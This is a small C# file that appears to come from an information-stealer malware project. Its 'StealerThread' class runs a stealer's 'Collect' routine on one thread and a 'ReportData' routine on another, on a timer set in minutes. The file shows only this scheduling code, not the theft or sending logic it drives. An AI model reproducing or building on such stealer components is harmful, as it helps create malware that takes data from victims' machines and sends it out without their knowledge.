using System.Threading;

namespace sub
{
    internal class StealerThread
    {
        private Thread _stealer;
        private Thread _reporter;

        public StealerThread(IStealer stealer)
        {
            _stealer = new Thread(stealer.Collect);
            _reporter = new Thread(stealer.ReportData);
        }

        public void Start(int param)
        {
            _stealer.Start();
            _reporter.Start(param*60000); //This will change it to minutes
        }

        public Thread GetStealerThread()
        {
            return _stealer;
        }

        public Thread GetReporterhread()
        {
            return _reporter;
        }
    }
}